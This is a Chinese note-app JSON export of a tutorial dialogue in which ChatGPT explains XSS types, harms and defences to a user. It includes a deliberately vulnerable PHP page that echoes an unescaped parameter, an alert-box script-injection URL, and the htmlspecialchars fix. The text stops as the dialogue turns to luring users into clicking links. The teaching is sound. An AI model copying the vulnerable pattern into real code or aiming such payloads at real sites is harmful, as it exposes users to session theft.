{"ID":"20241016092107-k42w04q","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241016092107-k42w04q","title":"XSS攻击","type":"doc","updated":"20241016093638"},"Children":[{"ID":"20241016092108-83chp9v","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20241016092108-83chp9v","updated":"20241016092108"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"## ","Properties":{"id":""}},{"Type":"NodeText","Data":"XSS攻击"}]},{"ID":"20241016092109-s0kqy7t","Type":"NodeBlockquote","Properties":{"id":"20241016092109-s0kqy7t","updated":"20241016092109"},"Children":[{"Type":"NodeBlockquoteMarker","Data":"\u003e ","Properties":{"id":""}},{"ID":"20241016092110-2trhvyf","Type":"NodeParagraph","Properties":{"id":"20241016092110-2trhvyf","updated":"20241016092110"},"Children":[{"Type":"NodeText","Data":"什么是跨站脚本（XSS）攻击？我对它完全不了解，你能详细给我讲讲吗？"}]}]},{"ID":"20241016092111-uin9qnx","Type":"NodeParagraph","Properties":{"id":"20241016092111-uin9qnx","updated":"20241016092111"},"Children":[{"Type":"NodeText","Data":"ChatGPT"}]},{"ID":"20241016092112-e5pyont","Type":"NodeParagraph","Properties":{"id":"20241016092112-e5pyont","updated":"20241016092112"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"a strong","TextMarkTextContent":"跨站脚本（Cross-Site Scripting，简称 XSS）"},{"Type":"NodeText","Data":"是一种网络安全攻击，攻击者通过在目标网站上注入恶意脚本，使得其他用户在访问该网站时执行这些脚本。XSS 攻击的主要目的是盗取用户敏感信息、执行未授权操作、劫持用户会话，甚至控制用户的浏览器。"}]},{"ID":"20241016092113-tnev40y","Type":"NodeParagraph","Properties":{"id":"20241016092113-tnev40y","updated":"20241016092113"},"Children":[{"Type":"NodeText","Data":"XSS 攻击主要分为三类："}]},{"ID":"20241016092114-9oc4cys","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092114-9oc4cys","updated":"20241016092114"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"1. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"存储型 XSS（Stored XSS）"}]},{"ID":"20241016092115-6kdqxjo","Type":"NodeParagraph","Properties":{"id":"20241016092115-6kdqxjo","updated":"20241016092115"},"Children":[{"Type":"NodeText","Data":"存储型 XSS 是最危险的一类，恶意脚本被永久存储在目标服务器上。当用户访问包含恶意脚本的页面时，浏览器会自动执行这些脚本。比如攻击者将一段恶意 JavaScript 代码存储在论坛的评论区，当其他用户查看该评论时，恶意代码会在他们的浏览器中执行。"}]},{"ID":"20241016092116-0bqiwvv","Type":"NodeBlockquote","Properties":{"id":"20241016092116-0bqiwvv","updated":"20241016092116"},"Children":[{"Type":"NodeBlockquoteMarker","Data":"\u003e ","Properties":{"id":""}},{"ID":"20241016092117-u2ppf3a","Type":"NodeParagraph","Properties":{"id":"20241016092117-u2ppf3a","updated":"20241016092117"},"Children":[{"Type":"NodeText","Data":"有恶意代码的评论存在数据库中了，所有用户都能看到这条恶意评论，那么所有用户的浏览器都会执行这段恶意代码"}]}]},{"ID":"20241016092118-ognow4m","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092118-ognow4m","updated":"20241016092118"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"2. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"反射型 XSS（Reflected XSS）"}]},{"ID":"20241016092119-zxbcvo9","Type":"NodeParagraph","Properties":{"id":"20241016092119-zxbcvo9","updated":"20241016092119"},"Children":[{"Type":"NodeText","Data":"反射型 XSS 发生在恶意脚本没有被存储在服务器上，而是通过用户提交的请求直接反射回给用户。比如攻击者构造了一个恶意的 URL，里面包含恶意代码，当用户点击这个链接时，服务器将链接中的恶意代码反射回网页，最终在用户的浏览器中执行。此类攻击通常通过社交工程诱导用户点击恶意链接。"}]},{"ID":"20241016092120-bk1satw","Type":"NodeBlockquote","Properties":{"id":"20241016092120-bk1satw","updated":"20241016092120"},"Children":[{"Type":"NodeBlockquoteMarker","Data":"\u003e ","Properties":{"id":""}},{"ID":"20241016092121-b3bn30d","Type":"NodeParagraph","Properties":{"id":"20241016092121-b3bn30d","updated":"20241016092121"},"Children":[{"Type":"NodeText","Data":"一般一一个查询的url，其中包含了查询的参数（比如百度搜索\"奔驰\"，而黑客的连接是\"奔驰"},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003c","Properties":{"id":""}}]},{"Type":"NodeText","Data":"script"},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003e","Properties":{"id":""}}]},{"Type":"NodeText","Data":"恶意js"},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003c","Properties":{"id":""}}]},{"Type":"NodeText","Data":"/script"},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003e","Properties":{"id":""}}]},{"Type":"NodeText","Data":"\"这样），参数提交到服务器后，服务器没有过滤，直接将结果和发过来的参数返回给浏览器了（例如页面显示 您的搜索：奔驰"},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003c","Properties":{"id":""}}]},{"Type":"NodeText","Data":"script"},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003e","Properties":{"id":""}}]},{"Type":"NodeText","Data":"恶意js"},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003c","Properties":{"id":""}}]},{"Type":"NodeText","Data":"/script"},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003e","Properties":{"id":""}}]},{"Type":"NodeText","Data":"）这样这段js就植入到你的页面中了"}]}]},{"ID":"20241016092122-7fy8upw","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092122-7fy8upw","updated":"20241016092122"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"3. "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"DOM 型 XSS"}]},{"ID":"20241016092123-o51w400","Type":"NodeParagraph","Properties":{"id":"20241016092123-o51w400","updated":"20241016092123"},"Children":[{"Type":"NodeText","Data":"DOM 型 XSS 发生在客户端（即浏览器端），攻击者修改页面的 DOM 结构，使得恶意脚本在浏览器端执行，而服务器并未参与数据处理。DOM 型 XSS 依赖于 JavaScript 和动态页面的交互。比如一个网页的 JavaScript 直接从 URL 获取数据并将其插入到页面中，而没有适当的过滤或转义，就可能导致 DOM 型 XSS。"}]},{"ID":"20241016092124-bmnhtqt","Type":"NodeBlockquote","Properties":{"id":"20241016092124-bmnhtqt","updated":"20241016092124"},"Children":[{"Type":"NodeBlockquoteMarker","Data":"\u003e ","Properties":{"id":""}},{"ID":"20241016092125-hn5hei0","Type":"NodeParagraph","Properties":{"id":"20241016092125-hn5hei0","updated":"20241016092125"},"Children":[{"Type":"NodeText","Data":"不发给服务器，恶意脚本在浏览器执行"}]}]},{"ID":"20241016092126-bxhzssx","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092126-bxhzssx","updated":"20241016092126"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"XSS 攻击的危害"}]},{"ID":"20241016092127-e2juygu","Type":"NodeParagraph","Properties":{"id":"20241016092127-e2juygu","updated":"20241016092127"},"Children":[{"Type":"NodeText","Data":"XSS 攻击可以造成以下危害："}]},{"ID":"20241016092128-39jovhp","Type":"NodeList","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092128-39jovhp","updated":"20241016092128"},"Children":[{"ID":"20241016092129-a4upbrp","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092129-a4upbrp","updated":"20241016092129"},"Children":[{"ID":"20241016092130-jk68bp9","Type":"NodeParagraph","Properties":{"id":"20241016092130-jk68bp9","updated":"20241016092130"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"劫持用户会话"},{"Type":"NodeText","Data":"：攻击者可以盗取用户的 Cookie，冒充用户的身份进行操作。"}]}]},{"ID":"20241016092131-kblszpg","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092131-kblszpg","updated":"20241016092131"},"Children":[{"ID":"20241016092132-1phflly","Type":"NodeParagraph","Properties":{"id":"20241016092132-1phflly","updated":"20241016092132"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"网页篡改"},{"Type":"NodeText","Data":"：攻击者可以通过注入恶意脚本修改网页内容，使其展示伪造信息。"}]}]},{"ID":"20241016092133-634gj4z","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092133-634gj4z","updated":"20241016092133"},"Children":[{"ID":"20241016092134-1ky0on9","Type":"NodeParagraph","Properties":{"id":"20241016092134-1ky0on9","updated":"20241016092134"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"重定向到恶意网站"},{"Type":"NodeText","Data":"：用户可以被重定向到一个伪造的页面，进一步被钓鱼或感染恶意软件。"}]}]},{"ID":"20241016092135-dna6d9i","Type":"NodeListItem","Data":"-","ListData":{"Tight":true,"BulletChar":45,"Padding":2,"Marker":"LQ==","Num":-1},"Properties":{"id":"20241016092135-dna6d9i","updated":"20241016092135"},"Children":[{"ID":"20241016092136-sjhmyfx","Type":"NodeParagraph","Properties":{"id":"20241016092136-sjhmyfx","updated":"20241016092136"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"执行未授权操作"},{"Type":"NodeText","Data":"：恶意脚本可以在用户的上下文中执行未授权的操作，比如发送假冒请求。"}]}]}]},{"ID":"20241016092137-0ig2ts3","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092137-0ig2ts3","updated":"20241016092137"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"XSS 攻击的防御措施"}]},{"ID":"20241016092138-0fmsi8s","Type":"NodeList","ListData":{"Typ":1,"Tight":true,"Start":1,"Delimiter":46,"Padding":3,"Marker":"MQ==","Num":1},"Properties":{"id":"20241016092138-0fmsi8s","updated":"20241016092138"},"Children":[{"ID":"20241016092139-o4g3oqe","Type":"NodeListItem","Data":"1","ListData":{"Typ":1,"Tight":true,"Start":1,"Delimiter":46,"Padding":3,"Marker":"MQ==","Num":1},"Properties":{"id":"20241016092139-o4g3oqe","updated":"20241016092139"},"Children":[{"ID":"20241016092140-flkif8a","Type":"NodeParagraph","Properties":{"id":"20241016092140-flkif8a","updated":"20241016092140"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"输出时转义（Escaping Output）"},{"Type":"NodeText","Data":"：确保在 HTML、JavaScript、CSS 等不同的上下文中输出用户输入时，正确转义特殊字符，防止注入恶意代码。"}]}]},{"ID":"20241016092141-ll9ozl3","Type":"NodeListItem","Data":"2","ListData":{"Typ":1,"Tight":true,"Start":2,"Delimiter":46,"Padding":3,"Marker":"Mg==","Num":2},"Properties":{"id":"20241016092141-ll9ozl3","updated":"20241016092141"},"Children":[{"ID":"20241016092142-mxxlte9","Type":"NodeParagraph","Properties":{"id":"20241016092142-mxxlte9","updated":"20241016092142"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"输入验证"},{"Type":"NodeText","Data":"：严格限制用户输入的格式，尤其是不信任的用户输入，防止注入危险字符。"}]}]},{"ID":"20241016092143-i20hwbl","Type":"NodeListItem","Data":"3","ListData":{"Typ":1,"Tight":true,"Start":3,"Delimiter":46,"Padding":3,"Marker":"Mw==","Num":3},"Properties":{"id":"20241016092143-i20hwbl","updated":"20241016092143"},"Children":[{"ID":"20241016092144-k9wl58v","Type":"NodeParagraph","Properties":{"id":"20241016092144-k9wl58v","updated":"20241016092144"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"使用内容安全策略（Content Security Policy，CSP）"},{"Type":"NodeText","Data":"：通过设置 CSP，限制网页加载外部资源和脚本，阻止恶意脚本的执行。"}]}]},{"ID":"20241016092145-j5bkzcc","Type":"NodeListItem","Data":"4","ListData":{"Typ":1,"Tight":true,"Start":4,"Delimiter":46,"Padding":3,"Marker":"NA==","Num":4},"Properties":{"id":"20241016092145-j5bkzcc","updated":"20241016092145"},"Children":[{"ID":"20241016092146-1dzueav","Type":"NodeParagraph","Properties":{"id":"20241016092146-1dzueav","updated":"20241016092146"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"编码用户输入"},{"Type":"NodeText","Data":"：在将用户输入展示在网页中时，采用合适的编码方式，防止 XSS 漏洞的产生。"}]}]},{"ID":"20241016092147-7gldz8p","Type":"NodeListItem","Data":"5","ListData":{"Typ":1,"Tight":true,"Start":5,"Delimiter":46,"Padding":3,"Marker":"NQ==","Num":5},"Properties":{"id":"20241016092147-7gldz8p","updated":"20241016092147"},"Children":[{"ID":"20241016092148-hw9v151","Type":"NodeParagraph","Properties":{"id":"20241016092148-hw9v151","updated":"20241016092148"},"Children":[{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"strong","TextMarkTextContent":"避免在 HTML 中直接使用用户输入"},{"Type":"NodeText","Data":"：尽量避免在动态生成的 HTML 内容中直接插入用户输入，尤其是涉及 JavaScript 的部分。"}]}]}]},{"ID":"20241016092149-5iyhws9","Type":"NodeParagraph","Properties":{"id":"20241016092149-5iyhws9","updated":"20241016092149"},"Children":[{"Type":"NodeText","Data":"通过这些措施，能够有效降低 XSS 攻击的风险。"}]},{"ID":"20241016092150-katgche","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20241016092150-katgche","updated":"20241016092150"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"## ","Properties":{"id":""}},{"Type":"NodeText","Data":"XSS攻击演示"}]},{"ID":"20241016092151-mo1rgqj","Type":"NodeBlockquote","Properties":{"id":"20241016092151-mo1rgqj","updated":"20241016092151"},"Children":[{"Type":"NodeBlockquoteMarker","Data":"\u003e ","Properties":{"id":""}},{"ID":"20241016092152-0csal9b","Type":"NodeParagraph","Properties":{"id":"20241016092152-0csal9b","updated":"20241016092152"},"Children":[{"Type":"NodeText","Data":"你能用一个具体的例子来说明吗？只是这么说的话有点抽象，你可以具体展示一下XSS攻击"}]}]},{"ID":"20241016092153-iirkt6e","Type":"NodeParagraph","Properties":{"id":"20241016092153-iirkt6e","updated":"20241016092153"},"Children":[{"Type":"NodeText","Data":"当然，我可以通过一个简单的例子来演示 XSS 攻击的工作原理。我们来看一个常见的反射型 XSS 攻击场景。"}]},{"ID":"20241016092154-ojvyw1a","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092154-ojvyw1a","updated":"20241016092154"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"例子场景："}]},{"ID":"20241016092155-jojv85i","Type":"NodeParagraph","Properties":{"id":"20241016092155-jojv85i","updated":"20241016092155"},"Children":[{"Type":"NodeText","Data":"假设有一个非常简单的搜索页面，用户输入搜索关键词后，服务器返回一个结果页面，显示类似这样的内容："}]},{"ID":"20241016092156-2zb40rp","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"aHRtbA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092156-2zb40rp","updated":"20241016092156"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"aHRtbA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003chtml\u003e\n\u003cbody\u003e\n    \u003ch1\u003e搜索结果\u003c/h1\u003e\n    \u003cp\u003e您搜索的关键词是：\u003cstrong\u003e关键词\u003c/strong\u003e\u003c/p\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092157-ldgzpxo","Type":"NodeParagraph","Properties":{"id":"20241016092157-ldgzpxo","updated":"20241016092157"},"Children":[{"Type":"NodeText","Data":"这个页面从 URL 获取用户输入的搜索关键词，并直接将其展示在网页上。如果开发人员没有对用户的输入进行任何过滤或转义，那么这个页面可能会受到 XSS 攻击。"}]},{"ID":"20241016092158-gssz50v","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092158-gssz50v","updated":"20241016092158"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"漏洞代码（服务器端假设）："}]},{"ID":"20241016092159-xr5u8do","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"cGhw","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092159-xr5u8do","updated":"20241016092159"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?php\n// 获取用户输入的关键词\n$keyword = $_GET['keyword'];\n?\u003e\n\u003chtml\u003e\n\u003cbody\u003e\n    \u003ch1\u003e搜索结果\u003c/h1\u003e\n    \u003cp\u003e您搜索的关键词是：\u003cstrong\u003e\u003c?php echo $keyword; ?\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092160-0ixrmbv","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092160-0ixrmbv","updated":"20241016092160"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"攻击方法："}]},{"ID":"20241016092161-nacyviv","Type":"NodeParagraph","Properties":{"id":"20241016092161-nacyviv","updated":"20241016092161"},"Children":[{"Type":"NodeText","Data":"攻击者可以构造一个带有恶意脚本的 URL，并诱导用户点击。例如，攻击者构造了以下链接："}]},{"ID":"20241016092162-um8rje2","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092162-um8rje2","updated":"20241016092162"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"http://example.com/search.php?keyword=\u003cscript\u003ealert('XSS攻击成功！');\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092163-pddoaaz","Type":"NodeParagraph","Properties":{"id":"20241016092163-pddoaaz","updated":"20241016092163"},"Children":[{"Type":"NodeText","Data":"当用户点击这个链接时，服务器并没有对 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"keyword"},{"Type":"NodeText","Data":" 参数"},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"a strong","TextMarkTextContent":"进行任何的过滤或转义"},{"Type":"NodeText","Data":"，于是生成的 HTML 页面会变成如下形式："}]},{"ID":"20241016092164-a2bhm80","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"aHRtbA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092164-a2bhm80","updated":"20241016092164"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"aHRtbA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003chtml\u003e\n\u003cbody\u003e\n    \u003ch1\u003e搜索结果\u003c/h1\u003e\n    \u003cp\u003e您搜索的关键词是：\u003cstrong\u003e\u003cscript\u003ealert('XSS攻击成功！');\u003c/script\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092165-qm9k3al","Type":"NodeParagraph","Properties":{"id":"20241016092165-qm9k3al","updated":"20241016092165"},"Children":[{"Type":"NodeText","Data":"由于 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026lt;script\u0026gt;"},{"Type":"NodeText","Data":" 标签直接被插入到了 HTML 中，浏览器会执行其中的 JavaScript 代码。于是，用户的浏览器会弹出一个提示框，显示 “XSS攻击成功！”。在实际的攻击中，恶意脚本可能会窃取用户的 Cookie、劫持用户会话，甚至加载其他恶意网站。"}]},{"ID":"20241016092166-bpa2woj","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241016092166-bpa2woj","updated":"20241016092166"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"防御措施："}]},{"ID":"20241016092167-69tgasy","Type":"NodeParagraph","Properties":{"id":"20241016092167-69tgasy","updated":"20241016092167"},"Children":[{"Type":"NodeText","Data":"要防止这种类型的攻击，"},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"a strong","TextMarkTextContent":"服务器需要对用户输入的内容进行处理，尤其是在输出时需要进行转义"},{"Type":"NodeText","Data":"。例如，在 PHP 中可以使用 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"htmlspecialchars"},{"Type":"NodeText","Data":" 函数来转义特殊字符："}]},{"ID":"20241016092168-cufj78y","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"cGhw","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092168-cufj78y","updated":"20241016092168"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cGhw","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?php\n// 获取用户输入并对其进行转义\n$keyword = htmlspecialchars($_GET['keyword'], ENT_QUOTES, 'UTF-8');\n?\u003e\n\u003chtml\u003e\n\u003cbody\u003e\n    \u003ch1\u003e搜索结果\u003c/h1\u003e\n    \u003cp\u003e您搜索的关键词是：\u003cstrong\u003e\u003c?php echo $keyword; ?\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092169-f0hyfwa","Type":"NodeParagraph","Properties":{"id":"20241016092169-f0hyfwa","updated":"20241016092169"},"Children":[{"Type":"NodeText","Data":"这样一来，即便攻击者输入了带有 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026lt;script\u0026gt;"},{"Type":"NodeText","Data":" 标签的关键词，服务器也会将 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026lt;"},{"Type":"NodeText","Data":" 和 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026gt;"},{"Type":"NodeText","Data":" 转义为 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026amp;lt;"},{"Type":"NodeText","Data":" 和 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026amp;gt;"},{"Type":"NodeText","Data":"，浏览器不会执行这些标签，恶意脚本也就不会被运行。例如："}]},{"ID":"20241016092170-5p8sjlc","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092170-5p8sjlc","updated":"20241016092170"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"http://example.com/search.php?keyword=\u003cscript\u003ealert('XSS攻击成功！');\u003c/script\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092171-2hc8rvo","Type":"NodeParagraph","Properties":{"id":"20241016092171-2hc8rvo","updated":"20241016092171"},"Children":[{"Type":"NodeText","Data":"输出的 HTML 将变为："}]},{"ID":"20241016092172-c6uedfc","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockInfo":"aHRtbA==","CodeBlockCloseFence":"YGBg","Properties":{"id":"20241016092172-c6uedfc","updated":"20241016092172"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"aHRtbA==","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003chtml\u003e\n\u003cbody\u003e\n    \u003ch1\u003e搜索结果\u003c/h1\u003e\n    \u003cp\u003e您搜索的关键词是：\u003cstrong\u003e\u0026lt;script\u0026gt;alert('XSS攻击成功！');\u0026lt;/script\u0026gt;\u003c/strong\u003e\u003c/p\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20241016092173-a99xtv4","Type":"NodeParagraph","Properties":{"id":"20241016092173-a99xtv4","updated":"20241016092173"},"Children":[{"Type":"NodeText","Data":"这里 "},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"code","TextMarkTextContent":"\u0026lt;script\u0026gt;"},{"Type":"NodeText","Data":" 标签被转义，页面安全了，"},{"Type":"NodeTextMark","Properties":{"id":""},"TextMarkType":"a strong","TextMarkTextContent":"浏览器将显示的是标签的文本内容，而不是执行它"},{"Type":"NodeText","Data":"。"}]},{"ID":"20241016092174-cal7289","Type":"NodeParagraph","Properties":{"id":"20241016092174-cal7289","updated":"20241016092174"},"Children":[{"Type":"NodeText","Data":"通过这个例子，可以更清楚地理解 XSS 是如何发生的，以及如何通过简单的转义操作来防御这种攻击。"}]},{"ID":"20241016092175-km6ijul","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20241016092175-km6ijul","updated":"20241016092175"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"## ","Properties":{"id":""}},{"Type":"NodeText","Data":"怎么让用户点击链接"}]},{"ID":"20241016092176-jn9fg8t","Type":"NodeBlockquote","Properties":{"id":"20241016092176-jn9fg8t","updated":"20241016092176"},"Children":[{"Type":"NodeBlockquoteMarker","Data":"\u003e ","Properties":{"id":""}},{"ID":"20241016092177-9nbw0rj","Type":"NodeParagraph","Properties":{"id":"20241016092177-9nbw0rj","updated":"20241016092177"},"Children":[{"Type":"NodeText","Data":"但是攻击者构造的URL并不能让用户点击到吧，攻击者的URL是在他自己的电脑上输入的呀？"}]}]},{"ID":"20241016092178-8d1mwa8","Type":"NodeParagraph","Properties":{"id":"20241016092178-8d1mwa8","updated":"20241016092178"},"Children":[{"Type":"NodeText","Data":"你提到了一个非常关键的问题！攻击者确实不能直接从他们自己的电脑上发起攻击，这就是 XSS 